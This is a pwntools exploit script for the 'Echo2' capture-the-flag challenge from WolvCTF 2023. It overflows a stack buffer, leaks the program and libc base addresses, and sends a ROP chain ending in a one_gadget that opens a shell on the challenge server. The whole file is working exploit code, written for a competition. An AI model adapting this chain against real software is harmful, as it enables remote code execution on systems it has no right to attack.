#!/usr/bin/python2

from pwn import *

exe = ELF("challenge_patched")
#libc = 
#ELF("libc6_2.34-0ubuntu1_amd64.so")

context.binary = exe

ru = lambda r,a: r.recvuntil('{}'.format(a))
sl = lambda r,a: r.sendline('{}'.format(a))
sla = lambda r,a,b: r.sendlineafter('{}'.format(a), '{}'.format(b))
g = lambda r: gdb.attach(r)

puts_got = 0x3fc0
puts_plt = 0x1094
puts_libc = 0x84ec0
one_gadget = 0xebcf8

setup1 = 0x000000000011f497#: pop rdx; pop r12; ret;
setup2 = 0x000000000002be51#: pop rsi; ret;

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("echotwo.wolvctf-2023.kctf.cloud", 1337)

    return r

def pad(start_val, payload, padding):
    return (start_val + "A"*(padding-len(start_val))) + payload


def start_loop(r):
    ru(r,"Echo2")
    sl(r,282)
    payload = pad("","\xe0\x10",279)
    #g(r)
    sl(r, payload)
    r.recvline()
    r.recvline()
    ret = r.recvline()
    ret = u64(ret[-7:-1] + "\x00\x00")
    return ret

def leak_libc(r, base):
    sl(r, 304)
    payload = p64(base + puts_plt)
    payload += p64(base + 0x10e0)
    payload += p64(base + puts_got)
    to_send = pad("",payload,279)
    sl(r, to_send)
    r.recvline()
    r.recvline()
    ret = r.recv(6)
    ret = u64(ret + "\x00\x00")
    return ret

def pwn(r, libc_base, base):
    sl(r, 328)
    payload = p64(base + 0x4500)
    payload += p64(libc_base + setup1)#0xeea9c)
    payload += p64(0)
    payload += p64(0)
    payload += p64(libc_base + setup2)
    payload += p64(0)
    payload += p64(libc_base + one_gadget)
    to_send = pad("",payload,271)
    sl(r, to_send)

def main():
    r = conn()

    base_leak = 0

    cont = True
    while cont:
        try:
            base_leak = start_loop(r)
            r.recvline()
            cont = False
        except:
            r.close()
            log.info("starting new")
            r = conn()
    base = base_leak - 0x10e0
    log.info("BASE LEAK: {}".format(hex(base_leak)))
    log.info("BASE: {}".format(hex(base)))
    # good luck pwning :)
    libc_leak = leak_libc(r, base)
    log.info("LEAK: {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x620D0
    print(hex(libc_base))
    log.info("LIBC BASE: {}".format(hex(libc_base)))

    #g(r)
    pwn(r, libc_base, base)


    r.interactive()


if __name__ == "__main__":
    main()
